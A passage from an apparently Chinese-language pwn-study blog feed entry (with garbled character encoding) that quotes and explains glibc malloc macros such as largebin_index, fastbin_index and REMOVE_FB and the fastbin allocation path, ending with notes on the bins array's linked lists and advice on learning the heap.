9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€å¤§ä¸²å…¨æ˜¯æ ¹æ®å®é™…ç”³è¯·å¤§å°è½¬æ¢ç›¸åº”binæ•°ç»„ä¸‹æ ‡çš„å®</p><h3 id="REMOVE-FB-fb-victim-pp"><a href="#REMOVE-FB-fb-victim-pp" class="headerlink" title="REMOVE_FB(fb, victim, pp)"></a>REMOVE_FB(fb, victim, pp)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line"><span class="meta">  do\</span></span><br><span class="line"><span class="meta">    &#123;\</span></span><br><span class="line"><span class="meta">      victim = pp;\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">    &#125;\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta"> != victim);\</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br></pre></td></tr></table></figure><h2 id="å›°æƒ‘"><a href="#å›°æƒ‘" class="headerlink" title="å›°æƒ‘"></a>å›°æƒ‘</h2><details class="folding-tag" green><summary> binsæ•°ç»„çš„åŒå‘é“¾è¡¨æ˜¯å¦‚ä½•å®ç°çš„[å·²è§£å†³] </summary>              <div class='content'>              <p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_231042.png" alt=""></p><p>ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸ªsmall binä½¿ç”¨äº†bins arrayä¸­çš„ä¸¤ä¸ªå…ƒç´ ï¼Œä»¥0ã€1ã€2ã€3å››ä¸ªå…ƒç´ ä¸ºä¾‹ï¼Œ<strong><em>ä»£ç ä¸­æŠŠè¿™éƒ¨åˆ†ç©ºé—´å¼ºåˆ¶è½¬æ¢æˆmalloc_chunkç±»å‹</em></strong>ï¼Œè¿™æ ·æ ¹æ®malloc_chunkæ•°æ®ç»“æ„çš„å®šä¹‰ï¼Œ3ã€4ä¸¤ä¸ªå…ƒç´ å°±å¯¹åº”äº†malloc_chunkä¸­çš„fdã€bkæŒ‡é’ˆï¼Œå®ƒä»¬ä½œä¸ºç¬¬ä¸€ä¸ªsmall binçš„è¡¨å¤´ï¼Œåˆ†åˆ«ç”¨æ¥æŒ‡å‘forwardå’Œbackwardæ–¹å‘çš„malloc_chunkï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_230420.png" alt=""></p>              </div>            </details><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>æœ€åï¼Œå †çš„å­¦ä¹ ç€å®éœ€è¦è€å¿ƒï¼Œæœ¬äººå°±æ˜¯ä¸­é€”æ— æ•°æ¬¡æ‘†çƒ‚ï¼Œè¿˜æ€»æ˜¯è¢«å„ç§ç»†èŠ‚å›°æƒ‘ï¼Œä½†åªè¦åšæŒæ€»æ˜¯èƒ½å…¥é—¨çš„ï¼Œå¦å¤–æœ‰æ—¶é‡åˆ°ä¸æ‡‚åˆæœä¸åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œä¸å¦¨é—®é—®chatgptæˆ–newbingä¹‹ç±»çš„aiï¼Œè™½ç„¶åŸºæœ¬åä¸ªé”™ä¹ä¸ªï¼ˆä¸»è¦æ˜¯gptï¼Œbingä¸æ‡‚çš„å®ƒä¸ä¼šçç­”ï¼‰ï¼Œä½†æ€»æ˜¯èƒ½ç»™ä¸ªæ–¹å‘ã€‚</p>]]></content>
    
    
    <summary type="html">ä¸€ä¸ªå­—ï¼šå°±TMè®©äººå¤´å¤§</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="å­¦ä¹ è®°å½•" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="å †" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
</feed>
